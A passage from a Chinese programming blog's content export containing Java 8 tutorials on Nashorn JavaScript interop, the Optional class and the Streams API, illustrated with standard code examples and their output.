<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class SuperRunner implements Runnable &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public void run() &#123;</span><br><span class="line">        System.out.println(&quot;super run&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来我们在 JavaScript 中重载 SuperRunner 。创建一个新的 Runner 实例时请注意 Nashorn 的扩展语法：其重载成员的语法是参考 Java 的匿名对象的做法。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var SuperRunner = Java.type(&#x27;com.winterbe.java8.SuperRunner&#x27;);</span><br><span class="line">var Runner = Java.extend(SuperRunner);</span><br><span class="line"> </span><br><span class="line">var runner = new Runner() &#123;</span><br><span class="line">    run: function() &#123;</span><br><span class="line">        Java.super(runner).run();</span><br><span class="line">        print(&#x27;on my run&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">runner.run();</span><br><span class="line"> </span><br><span class="line">// super run</span><br><span class="line">// on my run</span><br></pre></td></tr></table></figure>

<p>我们使用Java.super调用了重载方法 SuperRunner.run()。在JavaScript中执行其它脚本是十分容易的。我们可以load函数载入本地或远程的脚本。<br>在我的很多web前端中都使用了 Underscore.js ，因此在Nashorn中我们可以重用 Underscore：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">load(&#x27;http://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.6.0/underscore-min.js&#x27;);</span><br><span class="line"> </span><br><span class="line">var odds = _.filter([1, 2, 3, 4, 5, 6], function (num) &#123;</span><br><span class="line">    return num % 2 == 1;</span><br><span class="line">&#125;);</span><br><span class="line"> </span><br><span class="line">print(odds);  // 1, 3, 5</span><br></pre></td></tr></table></figure>

<p>扩展脚本的执行是在同一个 JavaScript 上下文中，因此我们可以直接访问 underscore 变量。记住脚本的加载可能会因为变量名的重叠导致代码出问题。我们可以通过将加载的脚本文件放置到一个新的全局上下文来解决这个问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loadWithNewGlobal(&#x27;script.js&#x27;);</span><br></pre></td></tr></table></figure>

<h3 id="命令行脚本"><a href="#命令行脚本" class="headerlink" title="命令行脚本"></a>命令行脚本</h3><p>如果你对用 Java 编写命令行脚本很感兴趣的话，可以试试 Nake 。Nake 是一个为 Java 8 Nashorn 准备的简单 Make 工具。你可以在 Nakefile 文件中定义任务，然后使用 nake — myTask 来运行任务。任务使用 JavaScript 编写并通过 Nashorn 脚本模式运行，因此你可以让你的终端应用完全利用 Java 8 API 和其他 Java 库强大的功能。</p>
<p>对 Java 开发者而言，编写命令行脚本从来没有如此简单过。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>JAVA8</category>
      </categories>
      <tags>
        <tag>JAVA8</tag>
      </tags>
  </entry>
  <entry>
    <title>(转)JAVA8之Optional类深度解析</title>
    <url>/blog/plang/java/features/java8/optional/</url>
    <content><![CDATA[<p>身为一名Java程序员，大家可能都有这样的经历：调用一个方法得到了返回值却不能直接将返回值作为参数去调用别的方法。我们首先要判断这个返回值是否为null，只有在非空的前提下才能将其作为其他方法的参数。这正是一些类似Guava的外部API试图解决的问题。一些JVM编程语言比如Scala、Ceylon等已经将对在核心API中解决了这个问题。</p>
<p>新版本的Java，比如Java 8引入了一个新的Optional类。Optional类的Javadoc描述如下：</p>
<p>这是一个可以为null的容器对象。如果值存在则isPresent()方法会返回true，调用get()方法会返回该对象。</p>
<p>本文会逐个探讨Optional类包含的方法，并通过一两个示例展示如何使用。</p>
<h3 id="of"><a href="#of" class="headerlink" title="of"></a>of</h3><p>为非null的值创建一个Optional。</p>
<p>of方法通过工厂方法创建Optional类。需要注意的是，创建对象时传入的参数不能为null。如果传入参数为null，则抛出NullPointerException 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//调用工厂方法创建Optional实例</span><br><span class="line">Optional&lt;String&gt; name = Optional.of(&quot;Sanaulla&quot;);</span><br><span class="line">//传入参数为null，抛出NullPointerException.</span><br><span class="line">Optional&lt;String&gt; someNull = Optional.of(null);</span><br></pre></td></tr></table></figure>
<h3 id="ofNullable"><a href="#ofNullable" class="headerlink" title="ofNullable"></a>ofNullable</h3><p>为指定的值创建一个Optional，如果指定的值为null，则返回一个空的Optional。</p>
<p>ofNullable与of方法相似，唯一的区别是可以接受参数为null的情况。示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//下面创建了一个不包含任何值的Optional实例</span><br><span class="line">//例如，值为&#x27;null&#x27;</span><br><span class="line">Optional empty = Optional.ofNullable(null);</span><br></pre></td></tr></table></figure>
<h3 id="isPresent"><a href="#isPresent" class="headerlink" title="isPresent"></a>isPresent</h3><p>非常容易理解</p>
<p>如果值存在返回true，否则返回false。</p>
<p>类似下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//isPresent方法用来检查Optional实例中是否包含值</span><br><span class="line">if (name.isPresent()) &#123;</span><br><span class="line">  //在Optional实例内调用get()返回已存在的值</span><br><span class="line">  System.out.println(name.get());//输出Sanaulla</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>如果Optional有值则将其返回，否则抛出NoSuchElementException。</p>
<p>上面的示例中，get方法用来得到Optional实例中的值。下面我们看一个抛出NoSuchElementException的例子：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//执行下面的代码会输出：No value present </span><br><span class="line">try &#123;</span><br><span class="line">  //在空的Optional实例上调用get()，抛出NoSuchElementException</span><br><span class="line">  System.out.println(empty.get());</span><br><span class="line">&#125; catch (NoSuchElementException ex) &#123;</span><br><span class="line">  System.out.println(ex.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ifPresent"><a href="#ifPresent" class="headerlink" title="ifPresent"></a>ifPresent</h3><p>如果Optional实例有值则为其调用consumer，否则不做处理</p>
<p>要理解ifPresent方法，首先需要了解Consumer类。简答地说，Consumer类包含一个抽象方法。该抽象方法对传入的值进行处理，但没有返回值。Java8支持不用接口直接通过lambda表达式传入参数。</p>
<p>如果Optional实例有值，调用ifPresent()可以接受接口段或lambda表达式。类似下面的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//ifPresent方法接受lambda表达式作为参数。</span><br><span class="line">//lambda表达式对Optional的值调用consumer进行处理。</span><br><span class="line">name.ifPresent((value) -&gt; &#123;</span><br><span class="line">  System.out.println(&quot;The length of the value is: &quot; + value.length());</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="orElse"><a href="#orElse" class="headerlink" title="orElse"></a>orElse</h3><p>如果有值则将其返回，否则返回指定的其它值。</p>
<p>如果Optional实例有值则将其返回，否则返回orElse方法传入的参数。示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//如果值不为null，orElse方法返回Optional实例的值。</span><br><span class="line">//如果为null，返回传入的消息。</span><br><span class="line">//输出：There is no value present!</span><br><span class="line">System.out.println(empty.orElse(&quot;There is no value present!&quot;));</span><br><span class="line">//输出：Sanaulla</span><br><span class="line">System.out.println(name.orElse(&quot;There is some value!&quot;));</span><br></pre></td></tr></table></figure>
<h3 id="orElseGet"><a href="#orElseGet" class="headerlink" title="orElseGet"></a>orElseGet</h3><p>orElseGet与orElse方法类似，区别在于得到的默认值。orElse方法将传入的字符串作为默认值，orElseGet方法可以接受Supplier接口的实现用来生成默认值。示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//orElseGet与orElse方法类似，区别在于orElse传入的是默认值，</span><br><span class="line">//orElseGet可以接受一个lambda表达式生成默认值。</span><br><span class="line">//输出：Default Value</span><br><span class="line">System.out.println(empty.orElseGet(() -&gt; &quot;Default Value&quot;));</span><br><span class="line">//输出：Sanaulla</span><br><span class="line">System.out.println(name.orElseGet(() -&gt; &quot;Default Value&quot;));</span><br></pre></td></tr></table></figure>
<h3 id="orElseThrow"><a href="#orElseThrow" class="headerlink" title="orElseThrow"></a>orElseThrow</h3><p>如果有值则将其返回，否则抛出supplier接口创建的异常。</p>
<p>在orElseGet方法中，我们传入一个Supplier接口。然而，在orElseThrow中我们可以传入一个lambda表达式或方法，如果值不存在来抛出异常。示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">  //orElseThrow与orElse方法类似。与返回默认值不同，</span><br><span class="line">  //orElseThrow会抛出lambda表达式或方法生成的异常</span><br><span class="line">  empty.orElseThrow(ValueAbsentException::new);</span><br><span class="line">&#125; catch (Throwable ex) &#123;</span><br><span class="line">  //输出: No value present in the Optional instance</span><br><span class="line">  System.out.println(ex.getMessage());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ValueAbsentException定义如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class ValueAbsentException extends Throwable &#123;</span><br><span class="line"></span><br><span class="line">  public ValueAbsentException() &#123;</span><br><span class="line">    super();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  public ValueAbsentException(String msg) &#123;</span><br><span class="line">    super(msg);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  @Override</span><br><span class="line">  public String getMessage() &#123;</span><br><span class="line">    return &quot;No value present in the Optional instance&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><p>map方法文档说明如下：</p>
<p>如果有值，则对其执行调用mapping函数得到返回值。如果返回值不为null，则创建包含mapping返回值的Optional作为map方法返回值，否则返回空Optional。</p>
<p>map方法用来对Optional实例的值执行一系列操作。通过一组实现了Function接口的lambda表达式传入操作。如果你不熟悉Function接口，可以参考我的这篇博客。map方法示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//map方法执行传入的lambda表达式参数对Optional实例的值进行修改。</span><br><span class="line">//为lambda表达式的返回值创建新的Optional实例作为map方法的返回值。</span><br><span class="line">Optional&lt;String&gt; upperName = name.map((value) -&gt; value.toUpperCase());</span><br><span class="line">System.out.println(upperName.orElse(&quot;No value found&quot;));</span><br></pre></td></tr></table></figure>

<h3 id="flatMap"><a href="#flatMap" class="headerlink" title="flatMap"></a>flatMap</h3><p>如果有值，为其执行mapping函数返回Optional类型返回值，否则返回空Optional。flatMap与map（Funtion）方法类似，区别在于flatMap中的mapper返回值必须是Optional。调用结束时，flatMap不会对结果用Optional封装。</p>
<p>flatMap方法与map方法类似，区别在于mapping函数的返回值不同。map方法的mapping函数返回值可以是任何类型T，而flatMap方法的mapping函数必须是Optional。</p>
<p>参照map函数，使用flatMap重写的示例如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//flatMap与map（Function）非常类似，区别在于传入方法的lambda表达式的返回类型。</span><br><span class="line">//map方法中的lambda表达式返回值可以是任意类型，在map函数返回之前会包装为Optional。 </span><br><span class="line">//但flatMap方法中的lambda表达式返回值必须是Optionl实例。 </span><br><span class="line">upperName = name.flatMap((value) -&gt; Optional.of(value.toUpperCase()));</span><br><span class="line">System.out.println(upperName.orElse(&quot;No value found&quot;));//输出SANAULLA</span><br></pre></td></tr></table></figure>

<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>filter个方法通过传入限定条件对Optional实例的值进行过滤。文档描述如下：</p>
<p>如果有值并且满足断言条件返回包含该值的Optional，否则返回空Optional。</p>
<p>读到这里，可能你已经知道如何为filter方法传入一段代码。是的，这里可以传入一个lambda表达式。对于filter函数我们应该传入实现了Predicate接口的lambda表达式。如果你不熟悉Predicate接口，可以参考这篇文章。</p>
<p>现在我来看看filter的各种用法，下面的示例介绍了满足限定条件和不满足两种情况：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//filter方法检查给定的Option值是否满足某些条件。</span><br><span class="line">//如果满足则返回同一个Option实例，否则返回空Optional。</span><br><span class="line">Optional&lt;String&gt; longName = name.filter((value) -&gt; value.length() &gt; 6);</span><br><span class="line">System.out.println(longName.orElse(&quot;The name is less than 6 characters&quot;));//输出Sanaulla</span><br><span class="line"></span><br><span class="line">//另一个例子是Optional值不满足filter指定的条件。</span><br><span class="line">Optional&lt;String&gt; anotherName = Optional.of(&quot;Sana&quot;);</span><br><span class="line">Optional&lt;String&gt; shortName = anotherName.filter((value) -&gt; value.length() &gt; 6);</span><br><span class="line">//输出：name长度不足6字符</span><br><span class="line">System.out.println(shortName.orElse(&quot;The name is less than 6 characters&quot;));</span><br></pre></td></tr></table></figure>

<p>以上，我们介绍了Optional类的各个方法。下面通过一个完整的示例对用法集中展示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class OptionalDemo &#123;</span><br><span class="line"> </span><br><span class="line">  public static void main(String[] args) &#123;</span><br><span class="line">    //创建Optional实例，也可以通过方法返回值得到。</span><br><span class="line">    Optional&lt;String&gt; name = Optional.of(&quot;Sanaulla&quot;);</span><br><span class="line"> </span><br><span class="line">    //创建没有值的Optional实例，例如值为&#x27;null&#x27;</span><br><span class="line">    Optional empty = Optional.ofNullable(null);</span><br><span class="line"> </span><br><span class="line">    //isPresent方法用来检查Optional实例是否有值。</span><br><span class="line">    if (name.isPresent()) &#123;</span><br><span class="line">      //调用get()返回Optional值。</span><br><span class="line">      System.out.println(name.get());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">      //在Optional实例上调用get()抛出NoSuchElementException。</span><br><span class="line">      System.out.println(empty.get());</span><br><span class="line">    &#125; catch (NoSuchElementException ex) &#123;</span><br><span class="line">      System.out.println(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    //ifPresent方法接受lambda表达式参数。</span><br><span class="line">    //如果Optional值不为空，lambda表达式会处理并在其上执行操作。</span><br><span class="line">    name.ifPresent((value) -&gt; &#123;</span><br><span class="line">      System.out.println(&quot;The length of the value is: &quot; + value.length());</span><br><span class="line">    &#125;);</span><br><span class="line"> </span><br><span class="line">    //如果有值orElse方法会返回Optional实例，否则返回传入的错误信息。</span><br><span class="line">    System.out.println(empty.orElse(&quot;There is no value present!&quot;));</span><br><span class="line">    System.out.println(name.orElse(&quot;There is some value!&quot;));</span><br><span class="line"> </span><br><span class="line">    //orElseGet与orElse类似，区别在于传入的默认值。</span><br><span class="line">    //orElseGet接受lambda表达式生成默认值。</span><br><span class="line">    System.out.println(empty.orElseGet(() -&gt; &quot;Default Value&quot;));</span><br><span class="line">    System.out.println(name.orElseGet(() -&gt; &quot;Default Value&quot;));</span><br><span class="line"> </span><br><span class="line">    try &#123;</span><br><span class="line">      //orElseThrow与orElse方法类似，区别在于返回值。</span><br><span class="line">      //orElseThrow抛出由传入的lambda表达式/方法生成异常。</span><br><span class="line">      empty.orElseThrow(ValueAbsentException::new);</span><br><span class="line">    &#125; catch (Throwable ex) &#123;</span><br><span class="line">      System.out.println(ex.getMessage());</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    //map方法通过传入的lambda表达式修改Optonal实例默认值。 </span><br><span class="line">    //lambda表达式返回值会包装为Optional实例。</span><br><span class="line">    Optional&lt;String&gt; upperName = name.map((value) -&gt; value.toUpperCase());</span><br><span class="line">    System.out.println(upperName.orElse(&quot;No value found&quot;));</span><br><span class="line"> </span><br><span class="line">    //flatMap与map（Funtion）非常相似，区别在于lambda表达式的返回值。</span><br><span class="line">    //map方法的lambda表达式返回值可以是任何类型，但是返回值会包装成Optional实例。</span><br><span class="line">    //但是flatMap方法的lambda返回值总是Optional类型。</span><br><span class="line">    upperName = name.flatMap((value) -&gt; Optional.of(value.toUpperCase()));</span><br><span class="line">    System.out.println(upperName.orElse(&quot;No value found&quot;));</span><br><span class="line"> </span><br><span class="line">    //filter方法检查Optiona值是否满足给定条件。</span><br><span class="line">    //如果满足返回Optional实例值，否则返回空Optional。</span><br><span class="line">    Optional&lt;String&gt; longName = name.filter((value) -&gt; value.length() &gt; 6);</span><br><span class="line">    System.out.println(longName.orElse(&quot;The name is less than 6 characters&quot;));</span><br><span class="line"> </span><br><span class="line">    //另一个示例，Optional值不满足给定条件。</span><br><span class="line">    Optional&lt;String&gt; anotherName = Optional.of(&quot;Sana&quot;);</span><br><span class="line">    Optional&lt;String&gt; shortName = anotherName.filter((value) -&gt; value.length() &gt; 6);</span><br><span class="line">    System.out.println(shortName.orElse(&quot;The name is less than 6 characters&quot;));</span><br><span class="line"> </span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码输出如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Sanaulla</span><br><span class="line">No value present</span><br><span class="line">The length of the value is: 8</span><br><span class="line">There is no value present!</span><br><span class="line">Sanaulla</span><br><span class="line">Default Value</span><br><span class="line">Sanaulla</span><br><span class="line">No value present in the Optional instance</span><br><span class="line">SANAULLA</span><br><span class="line">SANAULLA</span><br><span class="line">Sanaulla</span><br><span class="line">The name is less than 6 characters</span><br></pre></td></tr></table></figure>
<p>转自：<a href="http://www.importnew.com/6675.html">http://www.importnew.com/6675.html</a></p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>JAVA8</category>
      </categories>
      <tags>
        <tag>JAVA8</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA8之Streams API 详解</title>
    <url>/blog/plang/java/features/java8/steamapi/</url>
    <content><![CDATA[<p>[TOC]</p>
<h2 id="Stream-总览"><a href="#Stream-总览" class="headerlink" title="Stream 总览"></a>Stream 总览</h2><h3 id="什么是流"><a href="#什么是流" class="headerlink" title="什么是流"></a>什么是流</h3><p>Stream 不是集合元素，它不是数据结构并不保存数据，它是有关算法和计算的，它更像一个高级版本的 Iterator。原始版本的 Iterator，用户只能显式地一个一个遍历元素并对其执行某些操作；高级版本的 Stream，用户只要给出需要对其包含的元素执行什么操作，比如 “过滤掉长度大于 10 的字符串”、“获取每个字符串的首字母”等，Stream 会隐式地在内部进行遍历，做出相应的数据转换。</p>
<p>Stream 就如同一个迭代器（Iterator），单向，不可往复，数据只能遍历一次，遍历过一次后即用尽了，就好比流水从面前流过，一去不复返。</p>
<p>而和迭代器又不同的是，Stream 可以并行化操作，迭代器只能命令式地、串行化操作。顾名思义，当使用串行方式去遍历时，每个 item 读完后再读下一个 item。而使用并行去遍历时，数据会被分成多个段，其中每一个都在不同的线程中处理，然后将结果一起输出。Stream 的并行操作依赖于 Java7 中引入的 Fork&#x2F;Join 框架（JSR166y）来拆分任务和加速处理过程。Java 的并行 API 演变历程基本如下：</p>
<ul>
<li>1.0-1.4 中的 java.lang.Thread</li>
<li>5.0 中的 java.util.concurrent</li>
<li>6.0 中的 Phasers 等</li>
<li>7.0 中的 Fork&#x2F;Join 框架</li>
<li>8.0 中的 Lambda</li>
</ul>
<p>Stream 的另外一大特点是，数据源本身可以是无限的。</p>
<h3 id="流的构成"><a href="#流的构成" class="headerlink" title="流的构成"></a>流的构成</h3><p>当我们使用一个流的时候，通常包括三个基本步骤：</p>
<p>获取一个数据源（source）→ 数据转换→执行操作获取想要的结果，每次转换原有 Stream 对象不改变，返回一个新的 Stream 对象（可以有多次转换），这就允许对其操作可以像链条一样排列，变成一个管道。</p>
<p>有多种方式生成 Stream Source：</p>
<p><strong>从 Collection 和数组</strong></p>
<ul>
<li>Collection.stream()</li>
<li>Collection.parallelStream()</li>
<li>Arrays.stream(T array) or Stream.of()</li>
</ul>
<p><strong>从 BufferedReader</strong></p>
<ul>
<li>java.io.BufferedReader.lines()</li>
</ul>
<p><strong>静态工厂</strong></p>
<ul>
<li>java.util.stream.IntStream.range()</li>
<li>java.nio.file.Files.walk()</li>
</ul>
<p><strong>自己构建</strong></p>
<ul>
<li>java.util.Spliterator</li>
</ul>
<p><strong>其它</strong></p>
<ul>
<li>Random.ints()</li>
<li>BitSet.stream()</li>
<li>Pattern.splitAsStream(java.lang.CharSequence)</li>
<li>JarFile.stream()</li>
</ul>
<p><strong>流的操作类型分为两种：</strong></p>
<p>Intermediate：一个流可以后面跟随零个或多个 intermediate 操作。其目的主要是打开流，做出某种程度的数据映射&#x2F;过滤，然后返回一个新的流，交给下一个操作使用。这类操作都是惰性化的（lazy），就是说，仅仅调用到这类方法，并没有真正开始流的遍历。</p>
<p>Terminal：一个流只能有一个 terminal 操作，当这个操作执行后，流就被使用“光”了，无法再被操作。所以这必定是流的最后一个操作。Terminal 操作的执行，才会真正开始流的遍历，并且会生成一个结果，或者一个 side effect。</p>
<p>在对于一个 Stream 进行多次转换操作 (Intermediate 操作)，每次都对 Stream 的每个元素进行转换，而且是执行多次，这样时间复杂度就是 N（转换次数）个 for 循环里把所有操作都做掉的总和吗？其实不是这样的，转换操作都是 lazy 的，多个转换操作只会在 Terminal 操作的时候融合起来，一次循环完成。</p>
<p>我们可以这样简单的理解，Stream 里有个操作函数的集合，每次转换操作就是把转换函数放入这个集合中，在 Terminal 操作的时候循环 Stream 对应的集合，然后对每个元素执行所有的函数。</p>
<p>还有一种操作被称为 short-circuiting。用以指：</p>
<p>对于一个 intermediate 操作，如果它接受的是一个无限大（infinite&#x2F;unbounded）的 Stream，但返回一个有限的新 Stream。</p>
<p>对于一个 terminal 操作，如果它接受的是一个无限大的 Stream，但能在有限的时间计算出结果。</p>
<p>当操作一个无限大的 Stream，而又希望在有限时间内完成操作，则在管道内拥有一个 short-circuiting 操作是必要非充分条件。</p>
<p>清单 3. 一个流操作的示例</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int sum = widgets.stream()</span><br><span class="line">.filter(w -&gt; w.getColor() == RED)</span><br><span class="line"> .mapToInt(w -&gt; w.getWeight())</span><br><span class="line"> .sum();</span><br></pre></td></tr></table></figure>

<p>stream() 获取当前小物件的 source，filter 和 mapToInt 为 intermediate 操作，进行数据筛选和转换，最后一个 sum() 为 terminal 操作，对符合条件的全部小物件作重量求和。</p>
<h2 id="流的使用详解"><a href="#流的使用详解" class="headerlink" title="流的使用详解"></a>流的使用详解</h2><p>简单说，对 Stream 的使用就是实现一个 filter-map-reduce 过程，产生一个最终结果，或者导致一个副作用（side effect）。</p>
<h2 id="流的构造与转换"><a href="#流的构造与转换" class="headerlink" title="流的构造与转换"></a>流的构造与转换</h2><p>下面提供最常见的几种构造 Stream 的样例。</p>
<p>清单 4. 构造流的几种常见方法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. Individual values</span><br><span class="line">Stream stream = Stream.of(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;);</span><br><span class="line">// 2. Arrays</span><br><span class="line">String [] strArray = new String[] &#123;&quot;a&quot;, &quot;b&quot;, &quot;c&quot;&#125;;</span><br><span class="line">stream = Stream.of(strArray);</span><br><span class="line">stream = Arrays.stream(strArray);</span><br><span class="line">// 3. Collections</span><br><span class="line">List&lt;String&gt; list = Arrays.asList(strArray);</span><br><span class="line">stream = list.stream();</span><br></pre></td></tr></table></figure>

<p>需要注意的是，对于基本数值型，目前有三种对应的包装类型 Stream：</p>
<p>IntStream、LongStream、DoubleStream。当然我们也可以用 Stream<Integer>、Stream<Long> &gt;、Stream<Double>，但是 boxing 和 unboxing 会很耗时，所以特别为这三种基本数值型提供了对应的 Stream。</p>
<p>Java 8 中还没有提供其它数值型 Stream，因为这将导致扩增的内容较多。而常规的数值型聚合运算可以通过上面三种 Stream 进行。</p>
<p>清单 5. 数值流的构造</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IntStream.of(new int[]&#123;1, 2, 3&#125;).forEach(System.out::println);</span><br><span class="line">IntStream.range(1, 3).forEach(System.out::println);</span><br><span class="line">IntStream.rangeClosed(1, 3).forEach(System.out::println);</span><br></pre></td></tr></table></figure>

<p>清单 6. 流转换为其它数据结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. Array</span><br><span class="line">String[] strArray1 = stream.toArray(String[]::new);</span><br><span class="line">// 2. Collection</span><br><span class="line">List&lt;String&gt; list1 = stream.collect(Collectors.toList());</span><br><span class="line">List&lt;String&gt; list2 = stream.collect(Collectors.toCollection(ArrayList::new));</span><br><span class="line">Set set1 = stream.collect(Collectors.toSet());</span><br><span class="line">Stack stack1 = stream.collect(Collectors.toCollection(Stack::new));</span><br><span class="line">// 3. String</span><br><span class="line">String str = stream.collect(Collectors.joining()).toString();</span><br></pre></td></tr></table></figure>
<p>一个 Stream 只可以使用一次，上面的代码为了简洁而重复使用了数次。</p>
<h2 id="流的操作"><a href="#流的操作" class="headerlink" title="流的操作"></a>流的操作</h2><p>接下来，当把一个数据结构包装成 Stream 后，就要开始对里面的元素进行各类操作了。常见的操作可以归类如下。</p>
<p><strong>Intermediate：</strong></p>
<p>map (mapToInt, flatMap 等)、 filter、 distinct、 sorted、 peek、 limit、 skip、 parallel、 sequential、 unordered</p>
<p><strong>Terminal：</strong></p>
<p>forEach、 forEachOrdered、 toArray、 reduce、 collect、 min、 max、 count、 anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 iterator</p>
<p><strong>Short-circuiting：</strong></p>
<p>anyMatch、 allMatch、 noneMatch、 findFirst、 findAny、 limit</p>
<p>我们下面看一下 Stream 的比较典型用法。</p>
<h3 id="map-x2F-flatMap"><a href="#map-x2F-flatMap" class="headerlink" title="map&#x2F;flatMap"></a>map&#x2F;flatMap</h3><p>我们先来看 map。如果你熟悉 scala 这类函数式语言，对这个方法应该很了解，它的作用就是把 input Stream 的每一个元素，映射成 output Stream 的另外一个元素。</p>
<p>清单 7. 转换大写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; output = wordList.stream().</span><br><span class="line">map(String::toUpperCase).</span><br><span class="line">collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

<p>这段代码把所有的单词转换为大写。</p>
<p>清单 8. 平方数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;Integer&gt; nums = Arrays.asList(1, 2, 3, 4);</span><br><span class="line">List&lt;Integer&gt; squareNums = nums.stream().</span><br><span class="line">map(n -&gt; n * n).</span><br><span class="line">collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

<p>这段代码生成一个整数 list 的平方数 {1, 4, 9, 16}。</p>
<p>从上面例子可以看出，map 生成的是个 1:1 映射，每个输入元素，都按照规则转换成为另外一个元素。还有一些场景，是一对多映射关系的，这时需要 flatMap。</p>
<p>清单 9. 一对多</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Stream&lt;List&lt;Integer&gt;&gt; inputStream = Stream.of(</span><br><span class="line"> Arrays.asList(1),</span><br><span class="line"> Arrays.asList(2, 3),</span><br><span class="line"> Arrays.asList(4, 5, 6)</span><br><span class="line"> );</span><br><span class="line">Stream&lt;Integer&gt; outputStream = inputStream.</span><br><span class="line">flatMap((childList) -&gt; childList.stream());</span><br></pre></td></tr></table></figure>

<p>flatMap 把 input Stream 中的层级结构扁平化，就是将最底层元素抽出来放到一起，最终 output 的新 Stream 里面已经没有 List 了，都是直接的数字。</p>
<h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>filter 对原始 Stream 进行某项测试，通过测试的元素被留下来生成一个新 Stream。</p>
<p>清单 10. 留下偶数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Integer[] sixNums = &#123;1, 2, 3, 4, 5, 6&#125;;</span><br><span class="line">Integer[] evens =</span><br><span class="line">Stream.of(sixNums).filter(n -&gt; n%2 == 0).toArray(Integer[]::new);</span><br></pre></td></tr></table></figure>

<p>经过条件“被 2 整除”的 filter，剩下的数字为 {2, 4, 6}。</p>
<p>清单 11. 把单词挑出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">List&lt;String&gt; output = reader.lines().</span><br><span class="line"> flatMap(line -&gt; Stream.of(line.split(REGEXP))).</span><br><span class="line"> filter(word -&gt; word.length() &gt; 0).</span><br><span class="line"> collect(Collectors.toList());</span><br></pre></td></tr></table></figure>

<p>这段代码首先把每行的单词用 flatMap 整理到新的 Stream，然后保留长度不为 0 的，就是整篇文章中的全部单词了。</p>
<h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3><p>forEach 方法接收一个 Lambda 表达式，然后在 Stream 的每一个元素上执行该表达式。<br>清单 12. 打印姓名（forEach 和 pre-java8 的对比）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Java 8</span><br><span class="line">roster.stream()</span><br><span class="line"> .filter(p -&gt; p.getGender() == Person.Sex.MALE)</span><br><span class="line"> .forEach(p -&gt; System.out.println(p.getName()));</span><br><span class="line">// Pre-Java 8</span><br><span class="line">for (Person p : roster) &#123;</span><br><span class="line"> if (p.getGender() == Person.Sex.MALE) &#123;</span><br><span class="line"> System.out.println(p.getName());</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>对一个人员集合遍历，找出男性并打印姓名。可以看出来，forEach 是为 Lambda 而设计的，保持了最紧凑的风格。而且 Lambda 表达式本身是可以重用的，非常方便。当需要为多核系统优化时，可以 parallelStream().forEach()，只是此时原有元素的次序没法保证，并行的情况下将改变串行时操作的行为，此时 forEach 本身的实现不需要调整，而 Java8 以前的 for 循环 code 可能需要加入额外的多线程逻辑。</p>
<p>但一般认为，forEach 和常规 for 循环的差异不涉及到性能，它们仅仅是函数式风格与传统 Java 风格的差别。</p>
